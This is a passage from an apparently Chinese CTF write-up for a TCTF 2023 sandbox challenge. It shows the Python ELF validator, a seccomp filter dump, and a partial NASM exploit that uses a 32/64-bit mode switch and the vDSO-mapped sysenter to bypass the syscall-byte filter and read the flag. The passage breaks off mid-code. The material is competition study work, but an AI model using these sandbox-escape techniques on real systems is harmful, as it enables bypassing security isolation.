<span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_segments</span>(<span class="hljs-params">elf</span>):<br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_filesz &gt; <span class="hljs-number">0x10000</span> <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-number">0x10000</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_LOAD&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_GNU_STACK&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No executable stack&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x34</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x01\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x34</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x34</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &gt;= <span class="hljs-number">100</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> check_segments(elf)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha3_256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;File Hash: <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        path = <span class="hljs-string">f&#x27;./data/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/chroot/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;tctf/launcher32:2023&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ¯”nothingå¤šäº†ä¸€ä¸ªé€šè¿‡e_identè¦æ±‚32ä½çš„åˆ¤æ–­</p><h2 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1b</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0029</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0015</span><br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = prot &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0013</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = prot <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x18</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x2</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0015</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0020</span><br> <span class="hljs-number">0016</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00007ffd</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7ffd</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0018</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0019</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x13</span> <span class="hljs-number">0x20088750</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x20088750</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0021</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00000013</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x13</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0023</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0024</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x37331337</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x37331337</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0025</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000001c</span>  A = flags &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0026</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0027</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = flags <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0028</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0029</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0030</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0031</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0032</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0033</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == stat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0034</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000002d</span>  <span class="hljs-keyword">if</span> (A == recvfrom) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0035</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005a</span>  <span class="hljs-keyword">if</span> (A == chmod) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0036</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005b</span>  <span class="hljs-keyword">if</span> (A == fchmod) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0037</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A != ioprio_get) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0038</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0039</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><p>opençš„filenameè¦æ±‚çš„åœ°å€å˜äº†</p><h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p>wrapper.pyåˆ¤æ–­32ä½æ˜¯ç”¨çš„e_identï¼Œä½†Linuxè¿è¡Œæ—¶ä½¿ç”¨e_machineåˆ¤æ–­æ˜¯32ä½è¿˜æ˜¯64ä½ï¼Œæ‰€ä»¥ç¼–ä¸€ä¸ª64ä½çš„ç¨‹åºæ”¹ä¸€ä¸‹e_identå°±è¡Œï¼Œä½†è¿™æ ·gdbè°ƒä¸äº†IDAä¹Ÿåç¼–è¯‘ä¸äº†ï¼šï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global      _start<br>section     .text exec<br>BITS 32<br><br>    ; align 0x1000<br>vdso_landing:<br>; sysenter will use sysexit to return to some place in vsdo<br>; because is in 32bit, high 32bit will be clear<br>; we setup a soft landing place at the start of elf<br>; then mmap elf to vdso address<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br><br>    ; lea     esp, [stack]<br>    ; mov     esp, stack<br><br>retf_to_64:<br>    push    0x33            ; cs<br>    push    edi             ; ip<br>    retf                    ; jump to edi (64bit)<br><br>_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br>read_flag:<br>    mov     eax, 3          ; SYS_read (32bit)<br>    mov     ebx, 3          ; fd: flag<br>    mov     ecx, pad    ; buf<br>    mov     edx, 0x1000     ; count<br>    call    _sysenter<br>write_flag_to_stdout:<br>mov     edx, eax        ; count<br>    mov     eax, 4          ; SYS_write (32bit)<br>    mov     ebx, 1          ; fd: STDOUT<br>    mov     ecx, pad    ; buf<br>    call    _sysenter<br>exit_137:<br>    mov     eax, 1          ; SYS_exit (32bit)<br>    mov     ebx, 137        ; error_code<br>    call    _sysenter<br><br>BITS 64<br><br>; copy string at rsi to rdi, no return value<br>strcpy:<br>    cld<br>cpy1:<br>    lodsb<br>    stosb<br>    test al,al<br>    jne cpy1<br>    ret<br><br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br><br>_start:<br>find_elf_name:<br>    mov     r13, [rsp+8] ; argv[0]<br><br>; find vdso address on stack<br>    mov rdi, rsp<br>find_vdso_l1:<br>    cmp     QWORD [rdi],0x21<br>    je      find_vdso_l2<br>    add     rdi,0x8<br>    jmp     find_vdso_l1<br>find_vdso_l2: <br>    mov     r15, QWORD [rdi+0x8] ; r15 store vdso address, will be page aligned<br>    mov     rax, r15<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    